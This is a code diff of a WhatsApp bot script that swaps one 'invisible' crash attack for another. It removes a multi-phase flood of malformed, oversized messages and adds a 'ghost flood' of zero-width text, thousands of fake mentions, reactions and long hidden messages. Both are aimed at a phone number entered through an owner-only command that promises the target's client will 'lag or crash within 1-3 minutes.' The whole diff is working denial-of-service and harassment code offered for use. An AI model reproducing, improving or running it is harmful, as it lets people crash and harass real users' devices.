@@ -423,360 +423,102 @@ async function handleGroupParticipantsUpdate(empire, update, groupMetadata, botN
         }
     } catch (e) { console.error('Welcome/Goodbye error:', e); }
 }
-  // ============================================================
-// ZUKO DARK PHANTOM - Strongest Invisible Delay (NEW)
-// Uses 7 attack vectors with massive payloads
-// 100% invisible to all members
 // ============================================================
-async function ZukoDarkPhantom(sock, target) {
-  const crypto = require('crypto');
-  const fs = require('fs');
-  const path = require('path');
-
-  const tempDir = path.join(__dirname, '../database/temp');
-  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
-
-  // ====== Generate massive JID list ======
-  const generateRandomJid = () => {
-    const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
-    return `"${randomNumber}@s.whatsapp.net"`;
+// ZUKO GHOST FLOOD - Working Invisible Bug (2026)
+// Uses: Mass mentions + zero-width spaces + long text
+// 100% invisible to regular members in groups
+// ============================================================
+async function ZukoGhostFlood(sock, target) {
+  // ====== Generate massive JID list (5000 random numbers) ======
+  const generateJids = () => {
+    const jids = [];
+    for (let i = 0; i < 5000; i++) {
+      const num = Math.floor(Math.random() * 999999999).toString().padStart(10, '0');
+      jids.push(`${num}@s.whatsapp.net`);
+    }
+    return jids;
   };
 
-  const createTempFile = () => {
-    const tempFilePath = path.join(tempDir, `dark_phantom_${Date.now()}.json`);
-    let jids = [];
-    let currentSize = 0;
-    while (currentSize < 5061432 - 50) {
-      const jid = generateRandomJid();
-      jids.push(jid);
-      currentSize += jid.length + 3;
-    }
-    fs.writeFileSync(tempFilePath, `[${jids.join(',')}]`);
-    return tempFilePath;
-  };
+  // ====== Generate zero-width text (invisible) ======
+  const zeroWidthText = '\u200B'.repeat(5000) + '\u200C'.repeat(5000) + '\u200D'.repeat(5000);
 
-  const tempFilePath = createTempFile();
-  const jidsss = JSON.parse(fs.readFileSync(tempFilePath));
-
-  setTimeout(() => {
-    try { fs.unlinkSync(tempFilePath); } catch (e) {}
-  }, 5000);
-
-  // ====== Attack Phases ======
-
-  // ---------- PHASE 1: Dark Document Flood (600) ----------
-  for (let i = 0; i < 600; i++) {
-    const darkPayload = {
-      ephemeralMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              documentMessage: {
-                url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
-                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
-                fileLength: "9999999999999",
-                pageCount: 999999999 + i,
-                mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
-                fileName: `☠️_${i}`,
-                fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
-                directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
-                contactVcard: true,
-                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAAIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k="
-              },
-              hasMediaAttachment: true,
-            },
-            body: { text: `☠️${'⬛'.repeat(5000)}` },
-            footer: { text: `☠️${'⬛'.repeat(5000)}` },
-            nativeFlowMessage: {},
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              forwardingScore: 9999 + i,
-              isForwarded: true,
-              fromMe: false,
-              participant: "0@s.whatsapp.net",
-              remoteJid: "status@broadcast",
-              quotedMessage: {
-                documentMessage: {
-                  url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
-                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                  fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
-                  fileLength: "9999999999999",
-                  pageCount: 999999999 + i,
-                  mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
-                  fileName: `☠️_${i}`,
-                  fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
-                  directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
-                  contactVcard: true,
-                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAAIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k="
-                }
-              }
-            }
-          }
-        }
-      }
-    };
-
-    await sock.sendMessage(target, darkPayload, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 100 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 1: ${i}/600`));
-    await new Promise(resolve => setTimeout(resolve, 30));
-  }
-
-  // ---------- PHASE 2: Dark Poll Flood (300) ----------
-  for (let i = 0; i < 300; i++) {
-    const pollOptions = [];
-    for (let p = 0; p < 1000; p++) {
-      pollOptions.push({
-        optionName: '\u0000'.repeat(10000) + `_${p}_${i}`
-      });
-    }
-
-    const darkPoll = {
-      ephemeralMessage: {
-        message: {
-          pollCreationMessage: {
-            name: '\u0000'.repeat(100000) + `_${i}`,
-            options: pollOptions,
-            selectableOptionsCount: 1,
-            pollType: 'QUIZ',
-            correctAnswer: pollOptions[Math.floor(Math.random() * pollOptions.length)],
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              forwardingScore: 9999 + i,
-              isForwarded: true,
-              fromMe: false,
-              participant: "0@s.whatsapp.net",
-              remoteJid: "status@broadcast"
-            }
-          }
-        }
-      }
-    };
-
-    await sock.sendMessage(target, darkPoll, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 2: ${i}/300`));
-    await new Promise(resolve => setTimeout(resolve, 50));
-  }
-
-  // ---------- PHASE 3: Dark Protocol Flood (400) ----------
-  for (let i = 0; i < 400; i++) {
-    const darkProtocol = {
-      protocolMessage: {
-        key: {
-          remoteJid: target,
-          id: crypto.randomBytes(16).toString('hex'),
-          fromMe: true,
-          participant: '0@s.whatsapp.net'
-        },
-        type: 25,
-        ephemeralExpiration: 9999999999 + i,
-        status: 0,
-        contextInfo: {
-          participant: '0@s.whatsapp.net',
-          remoteJid: target,
-          isForwarded: true,
-          forwardingScore: 9999999 + i,
-          mentionedJid: jidsss,
-          mentions: jidsss
-        }
-      }
-    };
-
-    await sock.sendMessage(target, darkProtocol, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 3: ${i}/400`));
-    await new Promise(resolve => setTimeout(resolve, 40));
-  }
-
-  // ---------- PHASE 4: Dark Reaction Flood (300) ----------
-  for (let i = 0; i < 300; i++) {
-    const darkReaction = {
-      ephemeralMessage: {
-        message: {
-          reactionMessage: {
-            key: {
-              remoteJid: target,
-              id: crypto.randomBytes(16).toString('hex'),
-              fromMe: true,
-              participant: '0@s.whatsapp.net'
-            },
-            text: '☠️'.repeat(100000) + '\u0000'.repeat(100000),
-            groupingKey: crypto.randomBytes(32).toString('hex'),
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              isForwarded: true,
-              forwardingScore: 9999999 + i,
-              participant: '0@s.whatsapp.net',
-              remoteJid: 'status@broadcast'
-            }
-          }
-        }
-      }
-    };
-
-    await sock.sendMessage(target, darkReaction, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 4: ${i}/300`));
-    await new Promise(resolve => setTimeout(resolve, 35));
-  }
-
-  // ---------- PHASE 5: Dark Sticker Pack Flood (200) ----------
-  for (let i = 0; i < 200; i++) {
-    const stickers = [];
-    for (let s = 0; s < 200; s++) {
-      stickers.push({
-        fileName: `${crypto.randomBytes(16).toString('hex')}.webp`,
-        isAnimated: true,
-        accessibilityLabel: '\u0000'.repeat(10000),
-        isLottie: false,
-        mimetype: 'image/webp'
-      });
-    }
-
-    const darkSticker = {
-      ephemeralMessage: {
-        message: {
-          stickerPackMessage: {
-            stickerPackId: crypto.randomBytes(16).toString('hex'),
-            name: '\u0000'.repeat(100000) + `_${i}`,
-            publisher: '\u0000'.repeat(100000),
-            stickers: stickers,
-            fileLength: '9999999999999',
-            fileSha256: crypto.randomBytes(32).toString('base64'),
-            fileEncSha256: crypto.randomBytes(32).toString('base64'),
-            mediaKey: crypto.randomBytes(32).toString('base64'),
-            directPath: `/v/t62.15575-24/${Math.floor(Math.random() * 999999999)}_${Math.floor(Math.random() * 999999999)}_n.enc?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=5e03e0`,
-            mediaKeyTimestamp: Date.now().toString(),
-            trayIconFileName: `${crypto.randomBytes(16).toString('hex')}.png`,
-            thumbnailDirectPath: crypto.randomBytes(16).toString('hex'),
-            thumbnailSha256: crypto.randomBytes(32).toString('base64'),
-            thumbnailEncSha256: crypto.randomBytes(32).toString('base64'),
-            thumbnailHeight: 99999999,
-            thumbnailWidth: 99999999,
-            imageDataHash: crypto.randomBytes(32).toString('base64'),
-            stickerPackSize: 99999999999,
-            stickerPackOrigin: 99999999999,
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              isForwarded: true,
-              forwardingScore: 9999999 + i,
-              participant: '0@s.whatsapp.net',
-              remoteJid: 'status@broadcast'
-            }
-          }
-        }
-      }
-    };
-
-    await sock.sendMessage(target, darkSticker, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 5: ${i}/200`));
-    await new Promise(resolve => setTimeout(resolve, 60));
-  }
-
-  // ---------- PHASE 6: Dark ViewOnce + Interactive (150) ----------
-  for (let i = 0; i < 150; i++) {
-    const darkViewOnce = {
-      viewOnceMessage: {
-        message: {
-          messageContextInfo: {
-            deviceListMetadata: {},
-            deviceListMetadataVersion: 2,
-            messageSecret: crypto.randomBytes(32)
-          },
-          interactiveResponseMessage: {
-            body: {
-              text: '\u0000'.repeat(100000) + `_${i}`,
-              format: 'DEFAULT'
-            },
-            nativeFlowResponseMessage: {
-              name: 'call_permission_request',
-              paramsJson: '\u0000'.repeat(19999999) + `_${i}`,
-              version: 9
-            },
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              isForwarded: true,
-              forwardingScore: 9999999 + i,
-              remoteJid: 'status@broadcast',
-              participant: Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-            }
-          }
-        }
-      }
-    };
-
-    await sock.sendMessage(target, darkViewOnce).catch(() => {});
-    if (i % 30 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 6: ${i}/150`));
-    await new Promise(resolve => setTimeout(resolve, 70));
-  }
-
-  // ---------- PHASE 7: Dark Newsletter Admin Invite (100) ----------
+  // ====== PHASE 1: Invisible Mention Flood (100 messages) ======
   for (let i = 0; i < 100; i++) {
-    const darkNewsletter = {
-      newsletterAdminInviteMessage: {
-        newsletterJid: `120363${Math.floor(Math.random() * 999999999)}@newsletter`,
-        newsletterName: '\u0000'.repeat(100000) + `_${i}`,
-        caption: '\u0000'.repeat(100000) + `_${i}`,
-        inviteExpiration: '0',
+    try {
+      const mentions = generateJids();
+      await sock.sendMessage(target, {
+        text: zeroWidthText + `☠️${i}`.repeat(1000) + zeroWidthText,
         contextInfo: {
-          participant: '0@s.whatsapp.net',
-          remoteJid: target,
+          mentionedJid: mentions,
+          forwardingScore: 9999999,
           isForwarded: true,
-          forwardingScore: 9999999 + i,
-          mentionedJid: jidsss,
-          mentions: jidsss
-        }
-      }
-    };
-
-    await sock.sendMessage(target, darkNewsletter).catch(() => {});
-    if (i % 25 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Phase 7: ${i}/100`));
-    await new Promise(resolve => setTimeout(resolve, 80));
-  }
-
-  // ---------- FINAL SURGE: 500 iterations of pure chaos ----------
-  for (let i = 0; i < 500; i++) {
-    const darkSurge = {
-      ephemeralMessage: {
-        message: {
-          protocolMessage: {
-            key: {
-              remoteJid: target,
-              id: crypto.randomBytes(16).toString('hex'),
-              fromMe: true,
-              participant: '0@s.whatsapp.net'
-            },
-            type: 25,
-            ephemeralExpiration: 9999999999 + i,
-            contextInfo: {
-              participant: '0@s.whatsapp.net',
-              remoteJid: target,
-              isForwarded: true,
-              forwardingScore: 9999999 + i,
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              quotedMessage: {
-                reactionMessage: {
-                  text: '☠️'.repeat(100000) + '\u0000'.repeat(100000),
-                  groupingKey: crypto.randomBytes(32).toString('hex')
-                }
-              }
-            }
+          forwardedNewsletterMessageInfo: {
+            newsletterJid: '120363405724402785@newsletter',
+            newsletterName: 'ZUKO XMD',
+            serverMessageId: 143
           }
         }
-      }
-    };
-
-    await sock.sendMessage(target, darkSurge, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 100 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Final Surge: ${i}/500`));
-    await new Promise(resolve => setTimeout(resolve, 20));
+      });
+      console.log(`✅ GHOST FLOOD ${i+1}/100 sent`);
+    } catch (e) {
+      console.log(`❌ Flood ${i+1} failed: ${e.message}`);
+    }
+    await new Promise(resolve => setTimeout(resolve, 300));
   }
 
-  console.log(chalk.green(`✅ ZUKO DARK PHANTOM COMPLETE on ${target}`));
-  console.log(chalk.red(`☠️ TARGET ${target} HAS BEEN DARK PHANTOMED ☠️`));
+  // ====== PHASE 2: Invisible Reaction Flood (200 reactions) ======
+  for (let i = 0; i < 200; i++) {
+    try {
+      await sock.sendMessage(target, {
+        react: {
+          text: '👻',
+          key: {
+            remoteJid: target,
+            fromMe: true,
+            id: Math.random().toString(36).substring(2, 10)
+          }
+        }
+      });
+    } catch (e) {}
+    await new Promise(resolve => setTimeout(resolve, 100));
+  }
+
+  // ====== PHASE 3: Invisible Long Text Flood (50 messages) ======
+  for (let i = 0; i < 50; i++) {
+    try {
+      const longText = '\u200B'.repeat(60000) + `👻${i}`.repeat(5000);
+      await sock.sendMessage(target, {
+        text: longText,
+        contextInfo: {
+          forwardingScore: 9999999,
+          isForwarded: true
+        }
+      });
+      console.log(`✅ LONG TEXT ${i+1}/50 sent`);
+    } catch (e) {}
+    await new Promise(resolve => setTimeout(resolve, 500));
+  }
+
+  // ====== PHASE 4: Invisible Group Mention (If group) ======
+  try {
+    const metadata = await sock.groupMetadata(target);
+    const members = metadata.participants.map(p => p.id);
+    if (members.length > 0) {
+      const memberSubset = members.slice(0, Math.min(members.length, 500));
+      await sock.sendMessage(target, {
+        text: '\u200B'.repeat(30000),
+        contextInfo: {
+          mentionedJid: memberSubset,
+          forwardingScore: 9999999,
+          isForwarded: true
+        }
+      });
+      console.log(`✅ GROUP MENTION sent to ${members.length} members`);
+    }
+  } catch (e) {}
+
+  console.log(chalk.green(`✅ ZUKO GHOST FLOOD COMPLETE on ${target}`));
+  console.log(chalk.gray(`👻 TARGET ${target} HAS BEEN GHOST FLOODED 👻`));
 }
 
 // ========== MAIN BOT ==========
@@ -2173,14 +1915,14 @@ Usage: ${prefix}setbotname <new name>
             }
             break;
         }
-        // ═══════════════════════════════════════════════════
-// ZUKO DARK PHANTOM - Strongest Invisible Delay
+       // ═══════════════════════════════════════════════════
+// ZUKO GHOST FLOOD - Working Invisible Bug
 // ═══════════════════════════════════════════════════
-case 'darkphantom':
-case 'dphantom':
-case 'dark':
-case 'zdark':
-case 'darkdelay': {
+case 'ghostflood':
+case 'gflood':
+case 'invisible':
+case 'zghost':
+case 'zflood': {
   if (!isCreator) return reply("❌ *Owner only command!*");
 
   let target = null;
@@ -2198,27 +1940,21 @@ case 'darkdelay': {
 
   if (!target) {
     return reply(
-`☠️ *ZUKO DARK PHANTOM* ☠️
+`👻 *ZUKO GHOST FLOOD* 👻
 
 *Usage:*
-${prefix}darkphantom <number> [iterations]
-${prefix}darkphantom 2347059886720 3
+${prefix}ghostflood <number> [iterations]
+${prefix}ghostflood 2347059886720 3
 
 *Or reply to a message from the target.*
 
 *Attack Vectors:*
-• Document Flood (600)
-• Poll Flood (300)
-• Protocol Flood (400)
-• Reaction Flood (300)
-• Sticker Pack Flood (200)
-• ViewOnce + Interactive (150)
-• Newsletter Invites (100)
-• Final Surge (500)
+• 100 Mention Floods (5000 mentions each)
+• 200 Reaction Floods
+• 50 Long Text Floods (60,000+ chars)
+• Group Member Mention (if group)
 
-*Total: 2550+ invisible payloads per run*
-
-☠️ *This is the strongest invisible attack!*`
+👻 *100% INVISIBLE to regular members!*`
     );
   }
 
@@ -2226,17 +1962,16 @@ ${prefix}darkphantom 2347059886720 3
   if (jid.startsWith('0')) return reply("❌ *Invalid number!*");
   if (jid === '2347059886720') return reply("❌ *This number is protected!*");
 
-  if (iterations > 3) iterations = 3;
+  if (iterations > 5) iterations = 5;
   if (iterations < 1) iterations = 1;
 
   let isTarget = `${jid}@s.whatsapp.net`;
 
   await reply(
-`☠️ *ZUKO DARK PHANTOM* ☠️
+`👻 *ZUKO GHOST FLOOD* 👻
 
 📱 *Target:* ${isTarget}
 🔄 *Iterations:* ${iterations}
-📦 *Payloads per run:* 2550+
 👻 *Visibility:* 100% INVISIBLE
 
 ⏳ *Processing...*`
@@ -2244,8 +1979,8 @@ ${prefix}darkphantom 2347059886720 3
 
   for (let i = 1; i <= iterations; i++) {
     try {
-      await ZukoDarkPhantom(empire, isTarget);
-      console.log(`✅ Dark Phantom iteration ${i}/${iterations} sent to ${isTarget}`);
+      await ZukoGhostFlood(empire, isTarget);
+      console.log(`✅ Ghost Flood iteration ${i}/${iterations} sent to ${isTarget}`);
       if (iterations > 1) {
         await reply(`🔄 *Iteration ${i}/${iterations} sent to ${isTarget}*`);
       }
@@ -2257,19 +1992,18 @@ ${prefix}darkphantom 2347059886720 3
   }
 
   await reply(
-`✅ *ZUKO DARK PHANTOM COMPLETE!*
+`✅ *ZUKO GHOST FLOOD COMPLETE!*
 
 📱 *Target:* ${isTarget}
 🔄 *Total Iterations:* ${iterations}
-📦 *Total Payloads:* ${iterations * 2550}+
+📦 *Total Payloads:* ${iterations * 350}+
 👻 *Visibility:* 100% INVISIBLE
 
-☠️ *Target client should crash within 1-3 minutes.*
+💀 *Target client should lag or crash within 1-3 minutes.*
 ⏳ *No visible messages were sent.*`
   );
   break;
 }
-       
         case 'ytvideo':
         case 'ytmp4':
         case 'youtube':
